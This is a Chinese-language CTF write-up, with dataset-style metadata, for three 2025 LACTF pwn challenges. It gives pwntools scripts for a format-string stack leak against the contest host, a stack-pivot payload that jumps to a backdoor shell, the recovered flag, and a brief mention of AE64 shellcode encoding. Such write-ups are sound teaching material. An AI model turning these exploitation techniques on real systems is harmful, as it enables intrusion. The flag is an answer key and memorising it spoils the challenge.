---
title: 2025 LACTF writeup by Min-Venom（2password 格式化串+state-change+minceraft）
contest: 2025 LACTF
year: 2025
difficulty: medium
vuln_type: [pwn_unknown, fmt_string, heap_exploit]
tags: [LACTF 2password %i$p 格式化串泄栈, hunter2_cfc0xz68 flag, state-change 0xF1EEEE2D 校验常量, read=0x4012C1 通用 read, door=0x4011D6 后门, 0x404540+0x20-1 栈迁移, minceraft 看我世界 游戏化菜单, AE64 shellcode 编码]
attack_chain:
  - 2password: sendline(f"%{i}$p") for i in [6,9) 泄栈 → 小端序 hex → flag
  - flag: lactf{hunter2_cfc0xz68}
  - state-change: payload=b'a'*0x20+p64(0x404540+0x20-1)+p64(read) 栈迁移
  - 二次 pay=p32(0xF1EEEE2D)*9+b'a'*3+p64(door) 触发后门
  - minceraft 看我世界: pwn 菜单逆向
key_payload: "p.sendline(f'%{i}$p') for i in range(6, 9)"
one_liner: 2025 LACTF 三 pwn：2password 格式化串泄栈 + state-change read 栈迁移到 0xF1EEEE2D 后门 + minceraft 看我世界游戏菜单。
lesson: 格式化串 `%N$p` 泄栈 + 小端序 hex 转 flag 是入门 pwn 第一招；栈迁移要算准 `target_addr - 1` 让 rbp 写入后 leave 触发跳。
quality: medium
---

# 2025 LACTF writeup by Min-Venom

## 2password（格式化串泄栈）

```python
for i in range(6, 9):
    p = remote("chall.lac.tf", 31142)
    p.sendline(f"%{i}$p")
    p.sendline(b"1")
    p.sendline(b"1")
    p.interactive()
```
`%6$p` `%7$p` `%8$p` 泄 3 个栈值（64-bit 地址），小端序转 ASCII → `lactf{hunter2_cfc0xz68}`。

## state-change（read + 栈迁移）

```python
read = 0x4012C1
door = 0x4011D6
rl("Hey there, I'm deaddead. Who are you?")
payload = b'a' * 0x20 + p64(0x404540 + 0x20 - 1) + p64(read)  # 栈迁移
s(payload)
rl("Hey there, I'm deaddead. Who are you?")
payload = p32(0xF1EEEE2D)  # 校验常量
pay = p32(0xF1EEEE2D) * 9 + b'a' * 3 + p64(door)
s(pay)
```

- `0x404540+0x20-1` = rbp 目标，写入后 leave 跳到 read  
- `0xF1EEEE2D` 校验常量，9 个一组（共 36 字节）+ 3 字节 'a' 填充 + door 后门
- `door` 验证成功后调 shell

## minceraft（看我世界）

游戏化菜单 pwn，`AE64` 库用来编码 shellcode 绕过字符过滤。
